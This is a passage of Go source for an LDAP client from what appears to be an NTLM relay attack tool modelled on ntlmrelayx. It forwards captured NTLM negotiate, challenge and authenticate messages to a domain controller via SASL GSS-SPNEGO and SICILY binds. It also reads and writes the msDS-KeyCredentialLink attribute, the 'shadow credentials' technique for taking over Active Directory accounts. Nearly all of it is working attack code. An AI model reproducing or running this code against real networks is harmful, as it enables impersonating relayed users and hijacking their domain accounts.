		return fmt.Errorf("LDAP modify failed with result code %d: %s", code, errMsg)
	}

	c.logger.Debug("Successfully modified msDS-KeyCredentialLink")
	return nil
}

// searchKeyCredentialLink reads existing msDS-KeyCredentialLink values for a DN
func (c *LDAPClient) searchKeyCredentialLink(dn string) ([][]byte, error) {
	c.logger.Debug(fmt.Sprintf("Searching for existing msDS-KeyCredentialLink on %s", dn))

	if c.rawConn == nil {
		return nil, fmt.Errorf("not connected to LDAP")
	}

	// Build LDAP search request with BASE scope (only this DN)
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	searchRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 3, nil, "Search Request")
	searchRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, dn, "Base DN"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 0, "Scope (base)"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 3, "Deref Aliases (derefAlways)"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 0, "Size Limit"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 0, "Time Limit"))
	searchRequest.AppendChild(ber.NewBoolean(ber.ClassUniversal, ber.TypePrimitive, ber.TagBoolean, false, "Types Only"))

	// Build filter: (objectClass=*) - PRESENT filter must be TypePrimitive (0x87)
	filter := ber.NewString(ber.ClassContext, ber.TypePrimitive, 7, "objectClass", "Present Filter")
	searchRequest.AppendChild(filter)

	// Request attributes: SAMAccountName, objectSid, msDS-KeyCredentialLink (like ntlmrelayx)
	attributes := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Attributes")
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "SAMAccountName", "Attribute"))
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "objectSid", "Attribute"))
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "msDS-KeyCredentialLink", "Attribute"))
	searchRequest.AppendChild(attributes)

	packet.AppendChild(searchRequest)

	// Send search request
	if err := c.sendPacket(packet); err != nil {
		return nil, fmt.Errorf("failed to send search request: %w", err)
	}

	// Set read deadline
	c.rawConn.SetDeadline(time.Now().Add(5 * time.Second))
	defer c.rawConn.SetDeadline(time.Time{}) // Clear deadline after

	// Receive search entry response
	response, err := c.receivePacket()
	if err != nil {
		return nil, fmt.Errorf("failed to receive search response: %w", err)
	}

	// Parse search result entry
	if len(response.Children) < 2 {
		return nil, fmt.Errorf("invalid search response structure")
	}

	searchEntry := response.Children[1]

	// Check for SearchResultDone (tag 5) - attribute may not exist
	if searchEntry.Tag == 5 {
		c.logger.Debug("No existing msDS-KeyCredentialLink attribute (searchResDone only)")
		return [][]byte{}, nil // Return empty slice, not error
	}

	// Check for SearchResultEntry (tag 4)
	if searchEntry.Tag != 4 {
		return nil, fmt.Errorf("unexpected response type: tag=%d", searchEntry.Tag)
	}

	// Extract attributes from SearchResultEntry
	if len(searchEntry.Children) < 2 {
		c.logger.Debug("No attributes in search result")
		// Still need to read searchResDone
		_, err := c.receivePacket()
		if err != nil {
			return nil, fmt.Errorf("failed to receive searchResDone: %w", err)
		}
		return [][]byte{}, nil
	}

	attributesSeq := searchEntry.Children[1]
	if attributesSeq.Tag != ber.TagSequence {
		c.logger.Debug("No attributes sequence")
		// Still need to read searchResDone
		_, err := c.receivePacket()
		if err != nil {
			return nil, fmt.Errorf("failed to receive searchResDone: %w", err)
		}
		return [][]byte{}, nil
	}

	// Look for msDS-KeyCredentialLink attribute
	var existingValues [][]byte
	for _, attrSeq := range attributesSeq.Children {
		if len(attrSeq.Children) < 2 {
			continue
		}
		attrName, ok := attrSeq.Children[0].Value.(string)
		if !ok || attrName != "msDS-KeyCredentialLink" {
			continue
		}

		// Found the attribute, extract values
		valuesSet := attrSeq.Children[1]
		for _, valueNode := range valuesSet.Children {
			if val, ok := valueNode.Value.(string); ok {
				existingValues = append(existingValues, []byte(val))
			}
		}
	}

	c.logger.Debug(fmt.Sprintf("Found %d existing msDS-KeyCredentialLink values", len(existingValues)))

	// Read searchResDone
	searchDone, err := c.receivePacket()
	if err != nil {
		return nil, fmt.Errorf("failed to receive searchResDone: %w", err)
	}
	c.logger.Debug(fmt.Sprintf("searchResDone received (%d children)", len(searchDone.Children)))

	return existingValues, nil
}

// SearchUserDN searches for a user/computer account and returns its Distinguished Name
func (c *LDAPClient) SearchUserDN(samAccountName, baseDN string) (string, error) {
	c.logger.Debug(fmt.Sprintf("Searching for user: %s in %s", samAccountName, baseDN))

	if c.ldapConn == nil {
		return "", fmt.Errorf("go-ldap connection not initialized")
	}

	// Use go-ldap to search for the user
	filter := fmt.Sprintf("(sAMAccountName=%s)", ldap.EscapeFilter(samAccountName))
	searchRequest := ldap.NewSearchRequest(
		baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		1,     // sizeLimit = 1 (we only need one result)
		10,    // timeLimit = 10 seconds
		false, // typesOnly
		filter,
		[]string{"distinguishedName"},
		nil,
	)

	c.logger.Debug(fmt.Sprintf("Searching with filter: %s", filter))

	sr, err := c.ldapConn.Search(searchRequest)
	if err != nil {
		return "", fmt.Errorf("search failed: %w", err)
	}

	if len(sr.Entries) == 0 {
		return "", fmt.Errorf("user not found: %s", samAccountName)
	}

	dn := sr.Entries[0].DN
	c.logger.Debug(fmt.Sprintf("Found user DN: %s", dn))
	return dn, nil
}

// GetBaseDN retrieves the defaultNamingContext (base DN) from RootDSE
func (c *LDAPClient) GetBaseDN() (string, error) {
	// Return cached value if available
	if c.cachedBaseDN != "" {
		c.logger.Debug(fmt.Sprintf("Returning cached base DN: %s", c.cachedBaseDN))
		return c.cachedBaseDN, nil
	}

	c.logger.Debug("Querying RootDSE for base DN...")

	if c.rawConn == nil {
		return "", fmt.Errorf("not connected to LDAP")
	}

	// Build LDAP search request for RootDSE
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	searchRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 3, nil, "Search Request")
	searchRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Base DN (empty for RootDSE)"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 0, "Scope (base)"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 0, "Deref Aliases"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 1, "Size Limit"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 10, "Time Limit"))
	searchRequest.AppendChild(ber.NewBoolean(ber.ClassUniversal, ber.TypePrimitive, ber.TagBoolean, false, "Types Only"))

	// Build filter: (objectClass=*)
	filter := ber.Encode(ber.ClassContext, ber.TypeConstructed, 7, nil, "present")
	filter.AppendChild(ber.NewString(ber.ClassContext, ber.TypePrimitive, 0, "objectClass", "Attribute"))
	searchRequest.AppendChild(filter)

	// Attributes to return
	attributes := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Attributes")
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "defaultNamingContext", "Attribute"))
	searchRequest.AppendChild(attributes)

	packet.AppendChild(searchRequest)

	// Send search request
	if err := c.sendPacket(packet); err != nil {
		return "", fmt.Errorf("failed to send RootDSE query: %w", err)
	}

	// Set read deadline
	c.rawConn.SetDeadline(time.Now().Add(30 * time.Second))
	defer c.rawConn.SetDeadline(time.Time{}) // Clear deadline after

	// Receive response
	response, err := c.receivePacket()
	if err != nil {
		return "", fmt.Errorf("failed to receive RootDSE response: %w", err)
	}

	// Parse search result entry
	if len(response.Children) < 2 {
		return "", fmt.Errorf("invalid RootDSE response structure")
	}

	searchEntry := response.Children[1]
	if searchEntry.Tag != 4 {
		return "", fmt.Errorf("unexpected response type: tag=%d", searchEntry.Tag)
	}

	// SearchResultEntry structure: [DN, Attributes]
	if len(searchEntry.Children) < 2 {
		return "", fmt.Errorf("no attributes in RootDSE response")
	}

	attributes = searchEntry.Children[1]
	if attributes.Tag != ber.TagSequence {
		return "", fmt.Errorf("invalid attributes structure")
	}

	// Find defaultNamingContext attribute
	for _, attr := range attributes.Children {
		if len(attr.Children) < 2 {
			continue
		}

		attrName, ok := attr.Children[0].Value.(string)
		if !ok || attrName != "defaultNamingContext" {
			continue
		}

		// Get value set
		valueSet := attr.Children[1]
		if len(valueSet.Children) < 1 {
			continue
		}

		baseDN, ok := valueSet.Children[0].Value.(string)
		if !ok {
			return "", fmt.Errorf("invalid baseDN type")
		}

		c.logger.Debug(fmt.Sprintf("Found base DN: %s", baseDN))
		c.cachedBaseDN = baseDN // Cache it
		return baseDN, nil
	}

	return "", fmt.Errorf("defaultNamingContext not found in RootDSE")
}

// SetBaseDN sets the cached baseDN
func (c *LDAPClient) SetBaseDN(baseDN string) {
	c.cachedBaseDN = baseDN
}

// keepAlive performs a simple LDAP query to keep the connection alive and refresh state
// This matches what ntlmrelayx does after SICILY authentication
func (c *LDAPClient) keepAlive() error {
	if c.rawConn == nil {
		return fmt.Errorf("not connected to LDAP")
	}

	// Build LDAP search request for base query (empty DN, base scope)
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	searchRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 3, nil, "Search Request")
	searchRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Base DN (empty)"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 0, "Scope (base)"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 0, "Deref Aliases"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 0, "Size Limit"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 10, "Time Limit"))
	searchRequest.AppendChild(ber.NewBoolean(ber.ClassUniversal, ber.TypePrimitive, ber.TagBoolean, false, "Types Only"))

	// Build filter: (objectClass=*)
	filter := ber.Encode(ber.ClassContext, ber.TypeConstructed, 7, nil, "present")
	filter.AppendChild(ber.NewString(ber.ClassContext, ber.TypePrimitive, 0, "objectClass", "Attribute"))
	searchRequest.AppendChild(filter)

	// Attributes to return: defaultNamingContext to cache after authentication
	attributes := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Attributes")
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "defaultNamingContext", "Attribute"))
	searchRequest.AppendChild(attributes)

	packet.AppendChild(searchRequest)

	// Send search request
	if err := c.sendPacket(packet); err != nil {
		return fmt.Errorf("failed to send keepalive query: %w", err)
	}

	// Set read deadline
	c.rawConn.SetDeadline(time.Now().Add(10 * time.Second))
	defer c.rawConn.SetDeadline(time.Time{}) // Clear deadline after

	// Receive response and parse defaultNamingContext
	response, err := c.receivePacket()
	if err != nil {
		return fmt.Errorf("failed to receive keepalive response: %w", err)
	}

	c.logger.Debug(fmt.Sprintf("Keepalive response received (%d bytes)", len(response.Bytes())))

	// Parse and cache defaultNamingContext
	for _, child := range response.Children {
		if child.Tag == 4 && len(child.Children) >= 2 {
			// SearchResultEntry found
			attrs := child.Children[1]
			if attrs.Tag == ber.TagSequence {
				for _, attr := range attrs.Children {
					if len(attr.Children) >= 2 {
						attrName, ok := attr.Children[0].Value.(string)
						if ok && attrName == "defaultNamingContext" {
							valueSet := attr.Children[1]
							if len(valueSet.Children) >= 1 {
								if baseDN, ok := valueSet.Children[0].Value.(string); ok {
									c.cachedBaseDN = baseDN
									c.logger.Debug(fmt.Sprintf("Cached base DN from post-auth query: %s", baseDN))
									return nil
								}
							}
						}
					}
				}
			}
		}
	}

	c.logger.Debug("Keepalive query successful (no baseDN found)")
	return nil
}

// Close closes the LDAP connection
func (c *LDAPClient) Close() error {
	if c.rawConn != nil {
		c.rawConn.Close()
	}
	return nil
}

// ========== SASL GSS-SPNEGO Authentication Methods ==========

// ForwardNegotiateSASL forwards NTLM Type 1 via SASL GSS-SPNEGO
func (c *LDAPClient) ForwardNegotiateSASL(type1 []byte) ([]byte, error) {
	c.logger.Info("Forwarding NTLM Type 1 to LDAP via SASL GSS-SPNEGO...")

	// Send SASL bind with Type 1 wrapped in SPNEGO
	if err := c.saslBindInit(type1); err != nil {
		return nil, err
	}

	// Receive Type 2 wrapped in SPNEGO
	type2, err := c.saslReceiveChallenge()
	if err != nil {
		return nil, err
	}

	c.logger.Info(fmt.Sprintf("Received NTLM Type 2 challenge (%d bytes)", len(type2)))
	return type2, nil
}

// ForwardAuthenticateSASL forwards NTLM Type 3 via SASL GSS-SPNEGO
func (c *LDAPClient) ForwardAuthenticateSASL(type3 []byte) error {
	c.logger.Info("Forwarding NTLM Type 3 to LDAP via SASL GSS-SPNEGO...")

	// Send Type 3 wrapped in SPNEGO
	if err := c.saslBindResponse(type3); err != nil {
		return err
	}

	// Wait for final bind response
	if err := c.saslReceiveBindResponse(); err != nil {
		return fmt.Errorf("SASL authentication failed: %w", err)
	}

	// Clear any deadlines after successful authentication
	if c.rawConn != nil {
		c.rawConn.SetDeadline(time.Time{})
	}

	c.logger.Info("SASL GSS-SPNEGO authentication successful!")
	return nil
}

// saslBindInit sends initial SASL bind with Type 1 in SPNEGO NegTokenInit
func (c *LDAPClient) saslBindInit(type1 []byte) error {
	c.logger.Debug("Sending SASL bind init with NTLM Type 1...")

	// Wrap Type 1 in SPNEGO NegTokenInit
	spnegoBlob := c.wrapType1InSPNEGO(type1)

	// Build SASL bind request
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	bindRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 0, nil, "Bind Request")
	bindRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	bindRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "DN"))

	// SASL authentication with GSS-SPNEGO mechanism
	sasl := ber.Encode(ber.ClassContext, ber.TypeConstructed, 3, nil, "SASL Authentication")
	sasl.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "GSS-SPNEGO", "Mechanism"))
	sasl.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, string(spnegoBlob), "Credentials"))
	bindRequest.AppendChild(sasl)

	packet.AppendChild(bindRequest)

	return c.sendPacket(packet)
}

// saslReceiveChallenge receives SASL bind response with Type 2 in SPNEGO
func (c *LDAPClient) saslReceiveChallenge() ([]byte, error) {
	c.logger.Debug("Receiving SASL challenge (NTLM Type 2)...")

	response, err := c.receivePacket()
	if err != nil {
		return nil, fmt.Errorf("failed to receive SASL challenge: %w", err)
	}

	// Parse bind response
	if len(response.Children) < 2 {
		return nil, fmt.Errorf("invalid SASL bind response: expected at least 2 children, got %d", len(response.Children))
	}

	bindResponse := response.Children[1]
	if len(bindResponse.Children) < 2 {
		return nil, fmt.Errorf("invalid SASL bind response structure")
	}

	// Result code should be 14 (saslBindInProgress)
	if resultCode, ok := bindResponse.Children[0].Value.(int64); ok {
		if resultCode != 14 {
			return nil, fmt.Errorf("unexpected result code: %d (expected 14 for saslBindInProgress)", resultCode)
		}
	}

	// Extract server SASL credentials (SPNEGO blob with Type 2)
	var spnegoBlob []byte
	for _, child := range bindResponse.Children {
		if child.Tag == 7 && child.ClassType == ber.ClassContext {
			// This is the serverSaslCreds field
			if data, ok := child.Value.(string); ok {
				spnegoBlob = []byte(data)
			} else {
				spnegoBlob = child.Bytes()
			}
			break
		}
	}

	if len(spnegoBlob) == 0 {
		return nil, fmt.Errorf("no SASL credentials in bind response")
	}

	// Unwrap SPNEGO to get Type 2
	type2, err := c.unwrapSPNEGOResponse(spnegoBlob)
	if err != nil {
		return nil, fmt.Errorf("failed to unwrap SPNEGO: %w", err)
	}

	c.logger.Debug(fmt.Sprintf("Received NTLM Type 2 (%d bytes)", len(type2)))
	return type2, nil
}

// saslBindResponse sends SASL bind with Type 3 in SPNEGO NegTokenResp
func (c *LDAPClient) saslBindResponse(type3 []byte) error {
	c.logger.Debug("Sending SASL bind response with NTLM Type 3...")

	// Wrap Type 3 in SPNEGO NegTokenResp
	spnegoBlob := c.wrapType3InSPNEGO(type3)

	// Build SASL bind request
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	bindRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 0, nil, "Bind Request")
	bindRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	bindRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "DN"))

	// SASL authentication with GSS-SPNEGO mechanism
	sasl := ber.Encode(ber.ClassContext, ber.TypeConstructed, 3, nil, "SASL Authentication")
	sasl.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "GSS-SPNEGO", "Mechanism"))
	sasl.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, string(spnegoBlob), "Credentials"))
	bindRequest.AppendChild(sasl)

	packet.AppendChild(bindRequest)

	return c.sendPacket(packet)
}

// saslReceiveBindResponse receives final SASL bind response
func (c *LDAPClient) saslReceiveBindResponse() error {
	c.logger.Debug("Receiving SASL bind response...")

	response, err := c.receivePacket()
	if err != nil {
		return fmt.Errorf("failed to receive bind response: %w", err)
	}

	// Parse bind response
	if len(response.Children) < 2 {
		return fmt.Errorf("invalid bind response: expected at least 2 children, got %d", len(response.Children))
	}

	bindResponse := response.Children[1]
	if len(bindResponse.Children) == 0 {
		return fmt.Errorf("empty bind response")
	}

	// Check result code (should be 0 for success)
	resultCode, ok := bindResponse.Children[0].Value.(int64)
	if !ok {
		return fmt.Errorf("invalid result code type")
	}

	if resultCode != 0 {
		// Try to get error message
		errMsg := "unknown error"
		if len(bindResponse.Children) >= 3 {
			if msg, ok := bindResponse.Children[2].Value.(string); ok {
				errMsg = msg
			}
		}
		c.logger.Error(fmt.Sprintf("LDAP error: %s", errMsg))
		return fmt.Errorf("LDAP bind failed with result code %d: %s", resultCode, errMsg)
	}

	c.logger.Debug("SASL bind successful")
	return nil
}

// wrapType1InSPNEGO wraps NTLM Type 1 in SPNEGO NegTokenInit
func (c *LDAPClient) wrapType1InSPNEGO(type1 []byte) []byte {
	// NegTokenInit structure:
	// 0x60 [APPLICATION 0]
	//   0x06 OID (SPNEGO: 1.3.6.1.5.5.2)
	//   0xa0 [0]
	//     0x30 SEQUENCE
	//       0xa0 [0] mechTypes
	//         0x30 SEQUENCE
	//           0x06 OID (NTLMSSP: 1.3.6.1.4.1.311.2.2.10)
	//       0xa2 [2] mechToken
	//         0x04 OCTET STRING (Type 1)

	// SPNEGO OID: 1.3.6.1.5.5.2
	spnegoOID := []byte{0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02}

	// NTLMSSP OID: 1.3.6.1.4.1.311.2.2.10
	ntlmsspOID := []byte{0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a}

	// mechTypes
	mechTypes := append([]byte{0x30}, encodeLength(len(ntlmsspOID))...)
	mechTypes = append(mechTypes, ntlmsspOID...)
	mechTypesWrapper := append([]byte{0xa0}, encodeLength(len(mechTypes))...)
	mechTypesWrapper = append(mechTypesWrapper, mechTypes...)

	// mechToken
	octetString := append([]byte{0x04}, encodeLength(len(type1))...)
	octetString = append(octetString, type1...)
	mechToken := append([]byte{0xa2}, encodeLength(len(octetString))...)
	mechToken = append(mechToken, octetString...)

	// Inner SEQUENCE
	innerSeq := append(mechTypesWrapper, mechToken...)
	sequence := append([]byte{0x30}, encodeLength(len(innerSeq))...)
	sequence = append(sequence, innerSeq...)

	// Context wrapper
	contextWrapper := append([]byte{0xa0}, encodeLength(len(sequence))...)
	contextWrapper = append(contextWrapper, sequence...)

	// Add SPNEGO OID and wrap in APPLICATION tag
	content := append(spnegoOID, contextWrapper...)
	negTokenInit := append([]byte{0x60}, encodeLength(len(content))...)
	negTokenInit = append(negTokenInit, content...)

	return negTokenInit
}

// wrapType3InSPNEGO wraps NTLM Type 3 in SPNEGO NegTokenResp
func (c *LDAPClient) wrapType3InSPNEGO(type3 []byte) []byte {
	// NegTokenResp structure:
	// 0xa1 [1]
	//   0x30 SEQUENCE
	//     0xa2 [2] responseToken
	//       0x04 OCTET STRING (Type 3)

	// responseToken
	octetString := append([]byte{0x04}, encodeLength(len(type3))...)
	octetString = append(octetString, type3...)
	responseToken := append([]byte{0xa2}, encodeLength(len(octetString))...)
	responseToken = append(responseToken, octetString...)

	// SEQUENCE
	sequence := append([]byte{0x30}, encodeLength(len(responseToken))...)
	sequence = append(sequence, responseToken...)

	// NegTokenResp wrapper
	negTokenResp := append([]byte{0xa1}, encodeLength(len(sequence))...)
	negTokenResp = append(negTokenResp, sequence...)

	return negTokenResp
}

// unwrapSPNEGOResponse extracts NTLM message from SPNEGO NegTokenResp
func (c *LDAPClient) unwrapSPNEGOResponse(spnego []byte) ([]byte, error) {
	// Look for NTLMSSP signature
	ntlmSig := []byte("NTLMSSP\x00")
	idx := bytes.Index(spnego, ntlmSig)
	if idx != -1 {
		return spnego[idx:], nil
	}
	return nil, fmt.Errorf("NTLM message not found in SPNEGO response")
}

// encodeLength encodes ASN.1 length
func encodeLength(length int) []byte {
	if length < 128 {
		return []byte{byte(length)}
	}
	// Long form
	var lengthBytes []byte
	for length > 0 {
		lengthBytes = append([]byte{byte(length & 0xff)}, lengthBytes...)
		length >>= 8
	}
	return append([]byte{byte(0x80 | len(lengthBytes))}, lengthBytes...)
}

// ========== SICILY Authentication Methods ==========

// sicilyDiscovery performs SICILY package discovery
func (c *LDAPClient) sicilyDiscovery() error {
	c.logger.Debug("Sending SICILY package discovery")

	// Build SICILY discovery bind request
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	bindRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 0, nil, "Bind Request")
	bindRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	bindRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "DN"))

	// SASL mechanism: empty SASL auth (tag 9) triggers SICILY discovery
	auth := ber.NewString(ber.ClassContext, ber.TypePrimitive, 9, "", "SASL Authentication")
	bindRequest.AppendChild(auth)

	packet.AppendChild(bindRequest)

	// Send the packet
	if err := c.sendPacket(packet); err != nil {
		return err
	}

	// Receive response
	response, err := c.receivePacket()
	if err != nil {
		return fmt.Errorf("SICILY discovery failed: %w", err)
	}

	// Parse response to check for supported auth methods
	c.logger.Debug(fmt.Sprintf("SICILY discovery response received (len=%d)", len(response.Bytes())))

	return nil
}

// sicilyNegotiate sends NTLM Type 1 in SICILY negotiate
func (c *LDAPClient) sicilyNegotiate(type1 []byte) error {
	c.logger.Debug("Sending SICILY negotiate with NTLM Type 1")

	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	bindRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 0, nil, "Bind Request")
	bindRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	bindRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "NTLM", "SASL Mechanism"))

	// SASL credentials (tag 10) contains NTLM Type 1
	auth := ber.NewString(ber.ClassContext, ber.TypePrimitive, 10, string(type1), "SASL Credentials")
	bindRequest.AppendChild(auth)

	packet.AppendChild(bindRequest)

	return c.sendPacket(packet)
}

// sicilyReceiveChallenge receives NTLM Type 2 from SICILY response
func (c *LDAPClient) sicilyReceiveChallenge() ([]byte, error) {
	c.logger.Debug("Receiving SICILY challenge (NTLM Type 2)")

	response, err := c.receivePacket()
	if err != nil {
		return nil, err
	}

	// Navigate through BER structure to find the NTLM Type 2
	// Response structure: SEQUENCE -> BindResponse (tag 0x61) -> serverSaslCreds or matchedDN/diagnosticMessage
	if len(response.Children) < 2 {
		return nil, fmt.Errorf("invalid SICILY response structure")
	}

	bindResponse := response.Children[1]
	c.logger.Debug(fmt.Sprintf("BindResponse: tag=%d, class=%d, children=%d", bindResponse.Tag, bindResponse.ClassType, len(bindResponse.Children)))

	if bindResponse.Tag != 1 { // BindResponse is tag 1
		return nil, fmt.Errorf("expected BindResponse, got tag %d", bindResponse.Tag)
	}

	// Debug: print all children
	for i, child := range bindResponse.Children {
		c.logger.Debug(fmt.Sprintf("  Child %d: tag=%d, class=%d, len=%d, hex=%x", i, child.Tag, child.ClassType, len(child.ByteValue), child.ByteValue))
	}

	// Find NTLM Type 2 - it can be in:
	// 1. serverSaslCreds (tag 7, context class) - RFC 4511 standard SASL
	// 2. One of the OCTET STRING fields (tag 4) - some implementations put it in matchedDN or diagnosticMessage
	var type2 []byte

	// First try serverSaslCreds (standard location)
	for _, child := range bindResponse.Children {
		if child.Tag == 7 && child.ClassType == ber.ClassContext {
			type2 = child.ByteValue
			c.logger.Debug(fmt.Sprintf("Found NTLM Type 2 in serverSaslCreds (tag 7)"))
			break
		}
	}

	// If not found in serverSaslCreds, look for NTLMSSP signature in OCTET STRING fields
	if len(type2) == 0 {
		for i, child := range bindResponse.Children {
			if child.Tag == 4 && len(child.ByteValue) > 8 {
				// Check for NTLMSSP signature
				if len(child.ByteValue) >= 8 && string(child.ByteValue[0:7]) == "NTLMSSP" {
					type2 = child.ByteValue
					c.logger.Debug(fmt.Sprintf("Found NTLM Type 2 in OCTET STRING child %d (tag 4)", i))
					break
				}
			}
		}
	}

	if len(type2) == 0 {
		return nil, fmt.Errorf("no NTLM Type 2 found in SICILY response")
	}

	c.logger.Debug(fmt.Sprintf("Received NTLM Type 2 (%d bytes)", len(type2)))

	return type2, nil
}

// sicilyAuthenticate sends NTLM Type 3 in SICILY response
func (c *LDAPClient) sicilyAuthenticate(type3 []byte) error {
	c.logger.Debug("Sending SICILY authenticate with NTLM Type 3")

	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	bindRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 0, nil, "Bind Request")
	bindRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	// Name field must be empty for sicilyResponse (MS-ADTS 5.1.1.1.1)
	bindRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Name"))

	// sicilyResponse is context tag [11] = 0x8b (NOT tag 10/0x8a which is sicilyNegotiate!)
	auth := ber.NewString(ber.ClassContext, ber.TypePrimitive, 11, string(type3), "sicilyResponse")
	bindRequest.AppendChild(auth)

	packet.AppendChild(bindRequest)

	return c.sendPacket(packet)
}

// sicilyReceiveBindResponse receives the final bind response
func (c *LDAPClient) sicilyReceiveBindResponse() error {
	c.logger.Debug("Receiving SICILY bind response")

	response, err := c.receivePacket()
	if err != nil {
		return err
	}

	// Check result code
	if len(response.Children) < 2 {
		return fmt.Errorf("invalid bind response structure")
	}

	bindResponse := response.Children[1]
	if bindResponse.Tag != 1 {
		return fmt.Errorf("expected BindResponse, got tag %d", bindResponse.Tag)
	}

	// First child should be result code
	if len(bindResponse.Children) < 1 {
		return fmt.Errorf("no result code in bind response")
	}

	resultCode := bindResponse.Children[0]
	code, ok := resultCode.Value.(int64)
	if !ok {
		return fmt.Errorf("invalid result code type")
	}

	if code != 0 {
